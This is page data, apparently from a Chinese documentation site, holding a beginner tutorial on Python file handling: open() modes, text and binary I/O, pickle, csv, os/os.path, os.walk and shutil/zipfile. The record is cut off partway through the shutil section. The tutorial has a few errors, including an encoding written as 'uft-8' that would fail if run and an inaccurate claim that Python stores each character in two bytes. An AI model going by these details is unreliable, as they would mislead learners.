的属性和方法",normalizedTitle:"文件对象的属性和方法",charIndex:2965},{level:2,title:"任意位置操作文件",slug:"任意位置操作文件",normalizedTitle:"任意位置操作文件",charIndex:3943},{level:2,title:"pickle序列化",slug:"pickle序列化",normalizedTitle:"pickle序列化",charIndex:4225},{level:2,title:"CSV文件操作",slug:"csv文件操作",normalizedTitle:"csv文件操作",charIndex:4949},{level:2,title:"os和os.path模块",slug:"os和os-path模块",normalizedTitle:"os和os.path模块",charIndex:5540},{level:3,title:"os模块",slug:"os模块",normalizedTitle:"os模块",charIndex:5554},{level:3,title:"os模块操作文件",slug:"os模块操作文件",normalizedTitle:"os模块操作文件",charIndex:6345},{level:3,title:"os.path模块",slug:"os-path模块",normalizedTitle:"os.path模块",charIndex:5543},{level:3,title:"walk递归遍历所有的文件和目录",slug:"walk递归遍历所有的文件和目录",normalizedTitle:"walk递归遍历所有的文件和目录",charIndex:8217},{level:2,title:"shutil模块 拷贝和压缩",slug:"shutil模块-拷贝和压缩",normalizedTitle:"shutil模块 拷贝和压缩",charIndex:9558}],excerpt:'<h1 id="python文件操作的那些事"><a class="header-anchor" href="#python文件操作的那些事">#</a> Python文件操作的那些事</h1>\n<blockquote>\n<p>文件是数据持久化的一种重要的介质，通过文件的读写，可以将程序运行的数据保存到硬盘上，并可以在下一次运行程序的时，恢复之前的数据。很多软件系统是将数据存储到数据库中，而数据库实际上也是基于文件形式存储的。</p>\n</blockquote>\n',headersStr:"文本文件和二进制文件 文件操作模块简介 创建文件对象 文本文件处理 文本文件的写入 文本文件的读取 二进制文件的处理 文件对象的属性和方法 任意位置操作文件 pickle序列化 CSV文件操作 os和os.path模块 os模块 os模块操作文件 os.path模块 walk递归遍历所有的文件和目录 shutil模块 拷贝和压缩",content:'# Python文件操作的那些事\n\n> 文件是数据持久化的一种重要的介质，通过文件的读写，可以将程序运行的数据保存到硬盘上，并可以在下一次运行程序的时，恢复之前的数据。很多软件系统是将数据存储到数据库中，而数据库实际上也是基于文件形式存储的。\n\n\n# 文本文件和二进制文件\n\n按照文件的数据组织形式，架构文件分为文本文件和二进制文件两种。\n\n 1. 文本文件\n    \n    存储普通的字符文本，Python中默认使用unicode，一个字符占用两个字节，可表示65536个字符。\n\n 2. 二进制文件\n    \n    二进制文件把数据内容实用字节存储。无法直接使用文本工具打开。\n\n\n# 文件操作模块简介\n\nPython标准库中存在大量的文件操作相关的模块，如下表所示：\n\n名称                              说明\nio 模块                           文件流的输入和输出操作 inputoutput\nos 模块                           基本操作系统功能，包括文件操作\nglob 模块                         查找符合特定规则的文件路径名\nfnmatch 模块                      使用模式来匹配文件路径名\nfileinput 模块                    处理多个输入文件\nfilecmp 模块                      用于文件的比较\ncvs 模块                          用于 csv 文件处理\npickle 和 cPickle                用于序列化和反序列化\nxml 包                           用于 XML 数据处理\nbz2、gzip、zipfile、zlib、tarfile   用于处理压缩和解压缩文件（分别对应不同的算法）\n\n\n# 创建文件对象\n\n我们使用open创建一个文件对象，创建的方式如下面的例子所示，文件路径可以是全路径或者相对路径。因为路径分隔符涉及到转义的问题，可以使用原始字符串（字符串前面加一个r）表示路径：\n\nwith open(r"./error.log","w") as f:\n\n\n1\n\n\n文件的打开方式有下面的几种：\n\n模式   描述\nr    读 read 模式\nw    写 write 模式。如果文件不存在则创建；如果文件存在，则重写新内容；\na    追加 append 模式。如果文件不存在则创建；如果文件存在，则在文件末尾追加内容\nb    二进制 binary 模式（可与其他模式组合使用）\n+    读、写模式（可与其他模式组合使用）\n\n若果我们没有增加b，则默认处理的事文本文件的对象。\n\n\n# 文本文件处理\n\n\n# 文本文件的写入\n\n文本文件的写入包含三个步骤：\n\n 1. 创建文本文件对象\n 2. 写入数据\n 3. 关闭文件对象\n\n例子：\n\nf = open(r"aaa.txt","a")\ns = "abcd\\nabcd\\t\\thello"\nf.write(s)\nf.close()\n\n\n1\n2\n3\n4\n\n\n# 编码格式\n\n在操文本的时候，如果不注意编码格式的问题，经常会碰到乱码的问题，下面简单看一下几种编码格式的关系。\n\n\n\n# 中文乱码问题\n\nWindows默认的编码格式事GBK，Linux默认的编码格式是UTF-8，我们使用open打开文件时，默认使用的是系统编码。我们可以通过指定文件编码的格式解决中文的乱码问题。\n\nf = open(r"aaa.txt","a",encoding="uft-8")\n\n\n1\n\n\n# 使用write或者writeline写入数据\n\nwrite是将参数字符串写入到文件中，writelines是将字符串列表写入为难中，并切不添加换行符。\n\nf = open(r"./bbb.txt","w",encoding="utf-8")\ns = ["aa\\n","bb\\n"]\n# f.write(s)\nf.writelines(s)\n\n\n1\n2\n3\n4\n\n\n# close关闭文件流\n\n由于文件底层是有操作系统控制的，因此我们打开的文件对象需要显示调用close方法关闭文件对象。当调用了close方法时，首先会把缓冲区的数据写入到文件中，然后关闭文件，释放对象。通常情况下我们将close写到finally里面或者配合with使用。\n\nwith open(r"ccc.txt","w") as f:\n    f.write("helloworld")\n\ntry:\n    f = open(r"helloworld.txt","w")\n    f.write("ehahah")\nfinally:\n    f.close()\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# 文本文件的读取\n\n文本文件的读取一般使用如下的几种方式：\n\n 1. read([size])\n    \n    读取指定长度的字符，并且返回结果，如果没有指定字符长度，就会读取整个文件，\n\n 2. readline()\n    \n    以行为单位读取结果并返回，读取到最后会返回空串\n\n 3. readlines()\n    \n    文本文件中的每一行作为一个字符串存入列表，最后返回一个列表\n\n# 读取四个字符\nwith open(r"helloworld.txt","r") as f:\n    print(f.read(4))\n\n# 读取全部内容\nwith open(r"helloworld.txt","r") as f:\n    print(f.read())\n\n# 按行读取\nwith open("helloworld.txt","r") as f:\n    while True:\n        line = f.readline()\n        if not line:\n            break\n        else:\n            print(line,end="")\n\n# 迭代返回\nwith open("helloworld.txt","r") as f:\n    for l in f:\n        print(l,end="")\n\n# 读取列表\nwith open("helloworld.txt","r") as f:\n    lines = f.readlines()\n    lines = [line.rstrip()+"#"+str(index+1)+"\\n" for index,line in enumerate(lines) ]\n    print(lines)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n\n# 二进制文件的处理\n\n二进制文件的处理流程和文本文件一致，只是在创建文件对象的时候要指定时二进制模式的。\n\n\n# 文件对象的属性和方法\n\n文件对象中封装了文件的相关操作，并且封装了一些属性和方法，如下表所示：\n\n属性：\n\n属性       说明\nname     返回文件的名字\nmode     返回文件的打开模式\nclosed   若文件被关闭则返回 True\n\n文件的打开模式：\n\n模式   说明\nr    读模式\nw    写模式\na    追加模式\nb    二进制模式（可与其他模式组合）\n+    读写模式（可以其他模式组合）\n\n文件对象的常用方法\n\n方法名                     说明\nread([size])            从文件中读取 size 个字节或字符的内容返回。若省略[size]，则读 取到文件末尾，即一次读取文件所有内容\nreadline()              从文本文件中读取一行内容\nreadlines()             把文本文件中每一行都作为独立的字符串对象，并将这些对象放入 列表返回\nwrite(str)              将字符串 str 内容写入文件\nwritelines(s)           将字符串列表 s 写入文件文件，不添加换行符\nseek(offset[,whence])   把文件指针移动到新的位置，offset 表示相对于 whence 的多少个字节的偏移量； offset： off\n                        为正往结束方向移动，为负往开始方向移动 whence 不同的值代表不同含义： 0: 从文件头开始计算（默认值）\n                        1：从当前位置开始计算 2：从文件尾开始计算\ntell()                  返回文件指针的当前位置\ntruncate([size])        不论指针在什么位置，只留下指针前 size 个字节的内容，其余全 部删除； 如果没有传入\n                        size，则当指针当前位置到文件末尾内容全部删除\nflush()                 把缓冲区的内容写入文件，但不关闭文件\nclose()                 把缓冲区内容写入文件，同时关闭文件，释放文件对象相关资源\n\n\n# 任意位置操作文件\n\nseek移动文件指针：\n\nwith open("helloworld.txt","r") as f:\n    print("{name}".format(name=f.name))\n    print(f.tell())\n    print("读取文件的内容：{0}".format(str(f.readline())))\n    print(f.tell())\n    print(f.seek(0,0))\n    print("读取的文件内容：{0}".format(f.readline()))\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# pickle序列化\n\n在Python中一切都是对象，对象从本质上说是一个存储数据的内存块，有时候我们需要将内存中的数据保存到硬盘上或者通过网络发送给其他的计算机，在这个时候，就需要对象的序列化和反序列化的操作。对象的序列化机制十分广泛的应用与分布式和并行系统上。\n\n序列化指的是将对象转化为串行化的数据形式，存储到硬盘或者通过网络传输到其他的地方，反序列化时和序列化相反的过程，是将读取到的串行化的数据转化为对象。\n\n我们可以使用pickle模块中的函数实现序列化和反序列化的操作。\n\n常用的两个函数：\n\npickle.dump(obj,file) obj是要被序列化的文件，file是存储的文件\npickle.load(file) 从文件中读取数据，反序列化生成对象\n\n\n1\n2\n\n\n序列化数据：\n\nimport pickle\nwith open("haha.ser","wb") as f:\n    a1 = "halo"\n    a2 = 1\n    a3 = [10,2,3]\n    pickle.dump(a1,f)\n    pickle.dump(a2,f)\n    pickle.dump(a3,f)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n将文件反序列化为对象：\n\nimport pickle\nwith open("haha.ser","rb") as f:\n    a1 = pickle.load(f)\n    a2 = pickle.load(f)\n    a3 = pickle.load(f)\n    # a4 = pickle.load(f)\nprint(a1,a2,a3)\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# CSV文件操作\n\ncsv是一种以逗号分隔的文本文件格式，通常用于数据的交换，Excel文件和数据库的导入导出，和excel不同，csv的值没有类型，都是字符串，没有格式，没有工作表，没有图像。\n\nPython中标准库模块csv提供了一个读写csv对象的方式：\n\ncsv.reader读取csv文件\n\nimport csv\nwith open("test.csv","r") as f:\n    f_csv = csv.reader(f)\n    headers = next(f_csv)\n    print(headers)\n    for row in f_csv:\n        print(row)\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\ncsv.writer对象写入csv文件\n\nimport csv\nheaders = ["学号","姓名","年龄"]\nrows = [\n    ("1001","zhangsan",12),\n    ("1002","李四",12)\n]\n\nwith open("testwrite.csv","w") as f:\n    f_csv = csv.writer(f)\n    f_csv.writerow(headers)\n    f_csv.writerows(rows)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# os和os.path模块\n\nos模块可以帮助我们直接对操作系统进行相关的操作。我们可以直接调用操作系统的可执行命令、文件等等。\n\n\n# os模块\n\nos.system可以帮助我们直接调用系统的命令\n\nimport os\nos.system("whoami")\n\n\n1\n2\n\n\n调用ping命令\n\nimport os\nos.system("whoami")\nos.system("ping -c 4 www.baidu.com")\n\n"""\nplankton\nPING www.a.shifen.com (180.97.34.94): 56 data bytes\n64 bytes from 180.97.34.94: icmp_seq=0 ttl=55 time=15.469 ms\n64 bytes from 180.97.34.94: icmp_seq=1 ttl=55 time=19.000 ms\n64 bytes from 180.97.34.94: icmp_seq=2 ttl=55 time=19.176 ms\n64 bytes from 180.97.34.94: icmp_seq=3 ttl=55 time=19.265 ms\n\n--- www.a.shifen.com ping statistics ---\n4 packets transmitted, 4 packets received, 0.0% packet loss\nround-trip min/avg/max/stddev = 15.469/18.227/19.265/1.595 ms\n\n"""\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\nos.startfile调用安装好的程序：\n\nimport os\nos.startfile("文件路径")\n\n\n1\n2\n\n\n\n# os模块操作文件\n\n我们前面通过open操作打开文件写入和读取文件的内容，如果需要对文件和目录做其他的操作，则需要使用os和os.path模块。\n\nos模块中常用的操作文件的方法：\n\n方法名                描述\nremove(path)       删除指定的文件\nrename(src,dest)   重命名文件或目录\nstat(path)         返回文件的所有属性\nlistdir(path)      返回 path 目录下的文件和目录列表\n\nos模块下面常用的操作目录的方法：\n\n方法名                                描述\nmkdir(path)                        创建目录\nmakedirs(path1/path2/path3/... )   创建多级目录\nrmdir(path)                        删除目录\nremovedirs(path1/path2...)         删除多级目录\ngetcwd()                           返回当前工作目录：current work dir\nchdir(path)                        把 path 设为当前工作目录\nwalk()                             遍历目录树\nsep                                当前操作系统所使用的路径分隔符\n\n利用os创建删除获取文件的信息：\n\nimport os\nprint(os.name) # posix\nprint(os.sep) # /\nprint(repr(os.linesep)) # \'\\n\'\n\nprint(os.stat("demo.py")) #os.stat_result(st_mode=33188, st_ino=3401315, st_dev=16777222, st_nlink=1, st_uid=501, st_gid=20, st_size=24107, st_atime=1648276062, st_mtime=1648276062, st_ctime=1648276062)\n\n#############操作工作目录\nprint(os.getcwd())\nos.chdir("./")\n# os.mkdir("hello")\n############创建目录 创建多级目录 删除目录\n# os.rmdir("hello")\n# os.makedirs("hello/world")\n# os.removedirs("hello/world")\n# os.rename("test.csv","hello.csv")\n\ndirs = os.listdir("./")\nprint(dirs) # [\'helloworld.txt\', \'ccc.txt\', \'error.log\', \'hello.csv\', \'haha.ser\', \'demo.py\', \'testwrite.csv\', \'.idea\']\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# os.path模块\n\nos.path模块提供了目录相关的操作\n\n方法                   描述\nisabs(path)          判断 path 是否绝对路径\nisdir(path)          判断 path 是否为目录\nisfile(path)         判断 path 是否为文件\nexists(path)         判断指定路径的文件是否存在\ngetsize(filename)    返回文件的大小\nabspath(path)        返回绝对路径\ndirname(p)           返回目录的路径\ngetatime(filename)   返回文件的最后访问时间\ngetmtime(filename)   返回文件的最后修改时间\nwalk(top,func,arg)   递归方式遍历目录\njoin(path,*paths)    连接多个 path\nsplit(path)          对路径进行分割，以列表形式返回\nsplitext(path)       从路径中分割文件的扩展名\n\n\n# walk递归遍历所有的文件和目录\n\nos.walk方法会返回一个3个元素的元组：\n\ndirpath：要列出指定目录的路径\n\ndirnames：目录下的所有文件夹\n\nfilenames：目录下的所有文件\n\n使用walk递归遍历所有文件和目录\n\nimport os\n\nall_files = []\n\npath = os.getcwd()\nlistfiles = os.walk(path)\n\nfor dirpath,dirnames,filenames in listfiles:\n    for dir in dirnames:\n        all_files.append(os.path.join(dirpath,dir))\n    for name in filenames:\n        all_files.append(os.path.join(dirpath,name))\n\nfor file in all_files:\n    print(file)\n    \n"""\n/Users/plankton/Workspace/Py/StudyPy/.idea\n/Users/plankton/Workspace/Py/StudyPy/helloworld.txt\n/Users/plankton/Workspace/Py/StudyPy/ccc.txt\n/Users/plankton/Workspace/Py/StudyPy/error.log\n/Users/plankton/Workspace/Py/StudyPy/hello.csv\n/Users/plankton/Workspace/Py/StudyPy/haha.ser\n/Users/plankton/Workspace/Py/StudyPy/demo.py\n/Users/plankton/Workspace/Py/StudyPy/testwrite.csv\n/Users/plankton/Workspace/Py/StudyPy/.idea/inspectionProfiles\n/Users/plankton/Workspace/Py/StudyPy/.idea/StudyPy.iml\n/Users/plankton/Workspace/Py/StudyPy/.idea/.gitignore\n/Users/plankton/Workspace/Py/StudyPy/.idea/workspace.xml\n/Users/plankton/Workspace/Py/StudyPy/.idea/modules.xml\n/Users/plankton/Workspace/Py/StudyPy/.idea/misc.xml\n/Users/plankton/Workspace/Py/StudyPy/.idea/inspectionProfiles/profiles_settings.xml\n"""\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n\n# shutil模块 拷贝和压缩\n\nshutil是python标准库提供的用于文件和文件夹拷贝移动删除等，还可以用于文件的压缩和解压缩操作。\n\nos模块提供了对于目录和文件的一般操作，shutil模块作为补充，提供了移动压缩复制解压缩等操作。\n\n文件拷贝操作：\n\nimport shutil\nshutil.copy("helloworld.txt","helloworld1.txt")\n\n# 递归拷贝\nshutil.copytree("../","hello",ignore=shutil.ignore_patterns("*.html","*.ser"))\n\n\n\n1\n2\n3\n4\n5\n6\n\n\n压缩和解压缩操作：\n\n# 文件压缩\nimport shutil\nimport zipfile\n\n# 将当前文件夹的内容压缩生成code.zip放到上一级文件夹中\n# shutil.make_archive("../code","zip","./")\n\nz = zipfile.ZipFile("a.zip","w")\nz.write("hello.csv")\nz.write("haha.ser")\nz.close()\n\n# 解压缩\nz2 = zipfile.ZipFile("a.zip","r")\nz2.extractall("../hello")\nz2.close()\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n',normalizedContent:'# python文件操作的那些事\n\n> 文件是数据持久化的一种重要的介质，通过文件的读写，可以将程序运行的数据保存到硬盘上，并可以在下一次运行程序的时，恢复之前的数据。很多软件系统是将数据存储到数据库中，而数据库实际上也是基于文件形式存储的。\n\n\n# 文本文件和二进制文件\n\n按照文件的数据组织形式，架构文件分为文本文件和二进制文件两种。\n\n 1. 文本文件\n    \n    存储普通的字符文本，python中默认使用unicode，一个字符占用两个字节，可表示65536个字符。\n\n 2. 二进制文件\n    \n    二进制文件把数据内容实用字节存储。无法直接使用文本工具打开。\n\n\n# 文件操作模块简介\n\npython标准库中存在大量的文件操作相关的模块，如下表所示：\n\n名称                              说明\nio 模块                           文件流的输入和输出操作 inputoutput\nos 模块                           基本操作系统功能，包括文件操作\nglob 模块                         查找符合特定规则的文件路径名\nfnmatch 模块                      使用模式来匹配文件路径名\nfileinput 模块                    处理多个输入文件\nfilecmp 模块                      用于文件的比较\ncvs 模块                          用于 csv 文件处理\npickle 和 cpickle                用于序列化和反序列化\nxml 包                           用于 xml 数据处理\nbz2、gzip、zipfile、zlib、tarfile   用于处理压缩和解压缩文件（分别对应不同的算法）\n\n\n# 创建文件对象\n\n我们使用open创建一个文件对象，创建的方式如下面的例子所示，文件路径可以是全路径或者相对路径。因为路径分隔符涉及到转义的问题，可以使用原始字符串（字符串前面加一个r）表示路径：\n\nwith open(r"./error.log","w") as f:\n\n\n1\n\n\n文件的打开方式有下面的几种：\n\n模式   描述\nr    读 read 模式\nw    写 write 模式。如果文件不存在则创建；如果文件存在，则重写新内容；\na    追加 append 模式。如果文件不存在则创建；如果文件存在，则在文件末尾追加内容\nb    二进制 binary 模式（可与其他模式组合使用）\n+    读、写模式（可与其他模式组合使用）\n\n若果我们没有增加b，则默认处理的事文本文件的对象。\n\n\n# 文本文件处理\n\n\n# 文本文件的写入\n\n文本文件的写入包含三个步骤：\n\n 1. 创建文本文件对象\n 2. 写入数据\n 3. 关闭文件对象\n\n例子：\n\nf = open(r"aaa.txt","a")\ns = "abcd\\nabcd\\t\\thello"\nf.write(s)\nf.close()\n\n\n1\n2\n3\n4\n\n\n# 编码格式\n\n在操文本的时候，如果不注意编码格式的问题，经常会碰到乱码的问题，下面简单看一下几种编码格式的关系。\n\n\n\n# 中文乱码问题\n\nwindows默认的编码格式事gbk，linux默认的编码格式是utf-8，我们使用open打开文件时，默认使用的是系统编码。我们可以通过指定文件编码的格式解决中文的乱码问题。\n\nf = open(r"aaa.txt","a",encoding="uft-8")\n\n\n1\n\n\n# 使用write或者writeline写入数据\n\nwrite是将参数字符串写入到文件中，writelines是将字符串列表写入为难中，并切不添加换行符。\n\nf = open(r"./bbb.txt","w",encoding="utf-8")\ns = ["aa\\n","bb\\n"]\n# f.write(s)\nf.writelines(s)\n\n\n1\n2\n3\n4\n\n\n# close关闭文件流\n\n由于文件底层是有操作系统控制的，因此我们打开的文件对象需要显示调用close方法关闭文件对象。当调用了close方法时，首先会把缓冲区的数据写入到文件中，然后关闭文件，释放对象。通常情况下我们将close写到finally里面或者配合with使用。\n\nwith open(r"ccc.txt","w") as f:\n    f.write("helloworld")\n\ntry:\n    f = open(r"helloworld.txt","w")\n    f.write("ehahah")\nfinally:\n    f.close()\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# 文本文件的读取\n\n文本文件的读取一般使用如下的几种方式：\n\n 1. read([size])\n    \n    读取指定长度的字符，并且返回结果，如果没有指定字符长度，就会读取整个文件，\n\n 2. readline()\n    \n    以行为单位读取结果并返回，读取到最后会返回空串\n\n 3. readlines()\n    \n    文本文件中的每一行作为一个字符串存入列表，最后返回一个列表\n\n# 读取四个字符\nwith open(r"helloworld.txt","r") as f:\n    print(f.read(4))\n\n# 读取全部内容\nwith open(r"helloworld.txt","r") as f:\n    print(f.read())\n\n# 按行读取\nwith open("helloworld.txt","r") as f:\n    while true:\n        line = f.readline()\n        if not line:\n            break\n        else:\n            print(line,end="")\n\n# 迭代返回\nwith open("helloworld.txt","r") as f:\n    for l in f:\n        print(l,end="")\n\n# 读取列表\nwith open("helloworld.txt","r") as f:\n    lines = f.readlines()\n    lines = [line.rstrip()+"#"+str(index+1)+"\\n" for index,line in enumerate(lines) ]\n    print(lines)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n\n# 二进制文件的处理\n\n二进制文件的处理流程和文本文件一致，只是在创建文件对象的时候要指定时二进制模式的。\n\n\n# 文件对象的属性和方法\n\n文件对象中封装了文件的相关操作，并且封装了一些属性和方法，如下表所示：\n\n属性：\n\n属性       说明\nname     返回文件的名字\nmode     返回文件的打开模式\nclosed   若文件被关闭则返回 true\n\n文件的打开模式：\n\n模式   说明\nr    读模式\nw    写模式\na    追加模式\nb    二进制模式（可与其他模式组合）\n+    读写模式（可以其他模式组合）\n\n文件对象的常用方法\n\n方法名                     说明\nread([size])            从文件中读取 size 个字节或字符的内容返回。若省略[size]，则读 取到文件末尾，即一次读取文件所有内容\nreadline()              从文本文件中读取一行内容\nreadlines()             把文本文件中每一行都作为独立的字符串对象，并将这些对象放入 列表返回\nwrite(str)              将字符串 str 内容写入文件\nwritelines(s)           将字符串列表 s 写入文件文件，不添加换行符\nseek(offset[,whence])   把文件指针移动到新的位置，offset 表示相对于 whence 的多少个字节的偏移量； offset： off\n                        为正往结束方向移动，为负往开始方向移动 whence 不同的值代表不同含义： 0: 从文件头开始计算（默认值）\n                        1：从当前位置开始计算 2：从文件尾开始计算\ntell()                  返回文件指针的当前位置\ntruncate([size])        不论指针在什么位置，只留下指针前 size 个字节的内容，其余全 部删除； 如果没有传入\n                        size，则当指针当前位置到文件末尾内容全部删除\nflush()                 把缓冲区的内容写入文件，但不关闭文件\nclose()                 把缓冲区内容写入文件，同时关闭文件，释放文件对象相关资源\n\n\n# 任意位置操作文件\n\nseek移动文件指针：\n\nwith open("helloworld.txt","r") as f:\n    print("{name}".format(name=f.name))\n    print(f.tell())\n    print("读取文件的内容：{0}".format(str(f.readline())))\n    print(f.tell())\n    print(f.seek(0,0))\n    print("读取的文件内容：{0}".format(f.readline()))\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# pickle序列化\n\n在python中一切都是对象，对象从本质上说是一个存储数据的内存块，有时候我们需要将内存中的数据保存到硬盘上或者通过网络发送给其他的计算机，在这个时候，就需要对象的序列化和反序列化的操作。对象的序列化机制十分广泛的应用与分布式和并行系统上。\n\n序列化指的是将对象转化为串行化的数据形式，存储到硬盘或者通过网络传输到其他的地方，反序列化时和序列化相反的过程，是将读取到的串行化的数据转化为对象。\n\n我们可以使用pickle模块中的函数实现序列化和反序列化的操作。\n\n常用的两个函数：\n\npickle.dump(obj,file) obj是要被序列化的文件，file是存储的文件\npickle.load(file) 从文件中读取数据，反序列化生成对象\n\n\n1\n2\n\n\n序列化数据：\n\nimport pickle\nwith open("haha.ser","wb") as f:\n    a1 = "halo"\n    a2 = 1\n    a3 = [10,2,3]\n    pickle.dump(a1,f)\n    pickle.dump(a2,f)\n    pickle.dump(a3,f)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n将文件反序列化为对象：\n\nimport pickle\nwith open("haha.ser","rb") as f:\n    a1 = pickle.load(f)\n    a2 = pickle.load(f)\n    a3 = pickle.load(f)\n    # a4 = pickle.load(f)\nprint(a1,a2,a3)\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# csv文件操作\n\ncsv是一种以逗号分隔的文本文件格式，通常用于数据的交换，excel文件和数据库的导入导出，和excel不同，csv的值没有类型，都是字符串，没有格式，没有工作表，没有图像。\n\npython中标准库模块csv提供了一个读写csv对象的方式：\n\ncsv.reader读取csv文件\n\nimport csv\nwith open("test.csv","r") as f:\n    f_csv = csv.reader(f)\n    headers = next(f_csv)\n    print(headers)\n    for row in f_csv:\n        print(row)\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\ncsv.writer对象写入csv文件\n\nimport csv\nheaders = ["学号","姓名","年龄"]\nrows = [\n    ("1001","zhangsan",12),\n    ("1002","李四",12)\n]\n\nwith open("testwrite.csv","w") as f:\n    f_csv = csv.writer(f)\n    f_csv.writerow(headers)\n    f_csv.writerows(rows)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# os和os.path模块\n\nos模块可以帮助我们直接对操作系统进行相关的操作。我们可以直接调用操作系统的可执行命令、文件等等。\n\n\n# os模块\n\nos.system可以帮助我们直接调用系统的命令\n\nimport os\nos.system("whoami")\n\n\n1\n2\n\n\n调用ping命令\n\nimport os\nos.system("whoami")\nos.system("ping -c 4 www.baidu.com")\n\n"""\nplankton\nping www.a.shifen.com (180.97.34.94): 56 data bytes\n64 bytes from 180.97.34.94: icmp_seq=0 ttl=55 time=15.469 ms\n64 bytes from 180.97.34.94: icmp_seq=1 ttl=55 time=19.000 ms\n64 bytes from 180.97.34.94: icmp_seq=2 ttl=55 time=19.176 ms\n64 bytes from 180.97.34.94: icmp_seq=3 ttl=55 time=19.265 ms\n\n--- www.a.shifen.com ping statistics ---\n4 packets transmitted, 4 packets received, 0.0% packet loss\nround-trip min/avg/max/stddev = 15.469/18.227/19.265/1.595 ms\n\n"""\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\nos.startfile调用安装好的程序：\n\nimport os\nos.startfile("文件路径")\n\n\n1\n2\n\n\n\n# os模块操作文件\n\n我们前面通过open操作打开文件写入和读取文件的内容，如果需要对文件和目录做其他的操作，则需要使用os和os.path模块。\n\nos模块中常用的操作文件的方法：\n\n方法名                描述\nremove(path)       删除指定的文件\nrename(src,dest)   重命名文件或目录\nstat(path)         返回文件的所有属性\nlistdir(path)      返回 path 目录下的文件和目录列表\n\nos模块下面常用的操作目录的方法：\n\n方法名                                描述\nmkdir(path)                        创建目录\nmakedirs(path1/path2/path3/... )   创建多级目录\nrmdir(path)                        删除目录\nremovedirs(path1/path2...)         删除多级目录\ngetcwd()                           返回当前工作目录：current work dir\nchdir(path)                        把 path 设为当前工作目录\nwalk()                             遍历目录树\nsep                                当前操作系统所使用的路径分隔符\n\n利用os创建删除获取文件的信息：\n\nimport os\nprint(os.name) # posix\nprint(os.sep) # /\nprint(repr(os.linesep)) # \'\\n\'\n\nprint(os.stat("demo.py")) #os.stat_result(st_mode=33188, st_ino=3401315, st_dev=16777222, st_nlink=1, st_uid=501, st_gid=20, st_size=24107, st_atime=1648276062, st_mtime=1648276062, st_ctime=1648276062)\n\n#############操作工作目录\nprint(os.getcwd())\nos.chdir("./")\n# os.mkdir("hello")\n############创建目录 创建多级目录 删除目录\n# os.rmdir("hello")\n# os.makedirs("hello/world")\n# os.removedirs("hello/world")\n# os.rename("test.csv","hello.csv")\n\ndirs = os.listdir("./")\nprint(dirs) # [\'helloworld.txt\', \'ccc.txt\', \'error.log\', \'hello.csv\', \'haha.ser\', \'demo.py\', \'testwrite.csv\', \'.idea\']\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# os.path模块\n\nos.path模块提供了目录相关的操作\n\n方法                   描述\nisabs(path)          判断 path 是否绝对路径\nisdir(path)          判断 path 是否为目录\nisfile(path)         判断 path 是否为文件\nexists(path)         判断指定路径的文件是否存在\ngetsize(filename)    返回文件的大小\nabspath(path)        返回绝对路径\ndirname(p)           返回目录的路径\ngetatime(filename)   返回文件的最后访问时间\ngetmtime(filename)   返回文件的最后修改时间\nwalk(top,func,arg)   递归方式遍历目录\njoin(path,*paths)    连接多个 path\nsplit(path)          对路径进行分割，以列表形式返回\nsplitext(path)       从路径中分割文件的扩展名\n\n\n# walk递归遍历所有的文件和目录\n\nos.walk方法会返回一个3个元素的元组：\n\ndirpath：要列出指定目录的路径\n\ndirnames：目录下的所有文件夹\n\nfilenames：目录下的所有文件\n\n使用walk递归遍历所有文件和目录\n\nimport os\n\nall_files = []\n\npath = os.getcwd()\nlistfiles = os.walk(path)\n\nfor dirpath,dirnames,filenames in listfiles:\n    for dir in dirnames:\n        all_files.append(os.path.join(dirpath,dir))\n    for name in filenames:\n        all_files.append(os.path.join(dirpath,name))\n\nfor file in all_files:\n    print(file)\n    \n"""\n/users/plankton/workspace/py/studypy/.idea\n/users/plankton/workspace/py/studypy/helloworld.txt\n/users/plankton/workspace/py/studypy/ccc.txt\n/users/plankton/workspace/py/studypy/error.log\n/users/plankton/workspace/py/studypy/hello.csv\n/users/plankton/workspace/py/studypy/haha.ser\n/users/plankton/workspace/py/studypy/demo.py\n/users/plankton/workspace/py/studypy/testwrite.csv\n/users/plankton/workspace/py/studypy/.idea/inspectionprofiles\n/users/plankton/workspace/py/studypy/.idea/studypy.iml\n/users/plankton/workspace/py/studypy/.idea/.gitignore\n/users/plankton/workspace/py/studypy/.idea/workspace.xml\n/users/plankton/workspace/py/studypy/.idea/modules.xml\n/users/plankton/workspace/py/studypy/.idea/misc.xml\n/users/plankton/workspace/py/studypy/.idea/inspectionprofiles/profiles_settings.xml\n"""\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n\n# shutil模块 